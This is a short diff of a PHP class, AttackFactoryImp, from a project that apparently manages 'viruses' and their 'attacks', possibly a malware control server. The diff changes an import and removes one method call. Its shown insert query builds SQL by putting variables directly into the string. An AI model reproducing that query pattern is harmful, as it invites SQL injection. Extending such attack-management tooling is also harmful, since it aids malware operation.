@@ -6,7 +6,7 @@ namespace Kelvinho\Virus\Attack;
 
 use Kelvinho\Virus\Id\IdGenerator;
 use Kelvinho\Virus\Network\RequestData;
-use Kelvinho\Virus\Session\Session;
+use Kelvinho\Virus\Network\Session;
 use Kelvinho\Virus\Singleton\Logs;
 use Kelvinho\Virus\Usage\UsageFactory;
 use Kelvinho\Virus\User\UserFactory;
@@ -75,7 +75,6 @@ class AttackFactoryImp implements AttackFactory {
         if (!$this->mysqli->query("insert into attacks (attack_id, virus_id, attack_package, resource_usage_id) values (\"$attack_id\", \"$virus_id\", \"$attack_package\", " . $usage->getId() . ")")) Logs::mysql($this->mysqli);
         $attack->saveState();
         $attack = $this->get($attack_id);
-        $attack->setStaticUsage();
         return $attack;
     }
 
